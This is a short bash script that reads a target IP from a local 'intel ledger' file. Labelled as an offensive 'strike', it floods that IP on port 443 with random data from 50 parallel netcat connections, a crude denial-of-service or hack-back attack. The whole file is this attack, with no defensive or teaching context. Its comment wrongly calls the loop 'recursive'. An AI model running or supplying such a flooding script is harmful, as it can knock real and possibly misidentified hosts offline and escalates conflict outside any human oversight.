#!/bin/bash
IP_TO_STRIKE=$(grep "INTEL:" intel_ledger.txt | tail -n 1 | awk -F'IP=' '{print $2}' | awk -F' ' '{print $1}')
if [ -z "$IP_TO_STRIKE" ]; then echo "No target found."; exit; fi

echo "🚀 [STRIKE] Initiating Offensive Exhaustion on $IP_TO_STRIKE..."
# Sends a recursive loop of random high-entropy data to the adversary's open socket
for i in {1..50}; do
  timeout 1s cat /dev/urandom | nc -v $IP_TO_STRIKE 443 &>/dev/null &
done
